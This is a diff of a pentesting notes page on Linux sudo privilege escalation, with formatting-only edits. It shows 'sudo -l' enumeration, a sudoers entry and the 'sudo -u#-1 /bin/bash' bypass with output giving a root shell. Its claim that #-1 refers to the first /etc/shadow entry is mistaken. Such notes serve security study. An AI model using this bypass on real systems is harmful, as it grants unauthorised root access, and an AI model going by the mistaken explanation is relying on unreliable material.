@@ -6,7 +6,7 @@ GTFObins is a great resource for linux privilege escalation and will help you fi
 
 {% embed url="https://gtfobins.github.io/" %}
 
-**sudo -l **>>> see what executable binaries in the system we can use with sudo
+**sudo -l** >>> see what executable binaries in the system we can use with sudo
 
 ![](../../../.gitbook/assets/sudo.png)
 
@@ -50,7 +50,7 @@ User hacker may run the following commands on kali:
 
 User hacker sudo privilege in /etc/sudoers
 
-#### `# User privilege specification` ` root ALL=(ALL:ALL) ALL`
+#### `# User privilege specification`  `root ALL=(ALL:ALL) ALL`
 
 #### `hacker ALL=(ALL,!root) /bin/bash`
 
@@ -58,11 +58,11 @@ With ALL specified, user hacker can run the binary /bin/bash as any user
 
 ### Exploit
 
-**sudo -u#-1 /bin/bash **→ #-1 means the the first entry of the /etc/shadow file (root) so we can specify any user ID with a + like: #+1000
+**sudo -u#-1 /bin/bash** → #-1 means the the first entry of the /etc/shadow file (root) so we can specify any user ID with a + like: #+1000
 
 Example :
 
-#### `hacker@kali:~$ sudo -u#-1 /bin/bash` ` root@kali:/home/hacker# id` ` uid=0(root) gid=1000(hacker) groups=1000(hacker)` ` root@kali:/home/hacker#`
+#### `hacker@kali:~$ sudo -u#-1 /bin/bash`  `root@kali:/home/hacker# id`  `uid=0(root) gid=1000(hacker) groups=1000(hacker)`  `root@kali:/home/hacker#`
 
 #### &#x20;Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv -u#-1 returns as 0 which is root's id and /bin/bash is executed with root permission Proof of Concept Code :
 
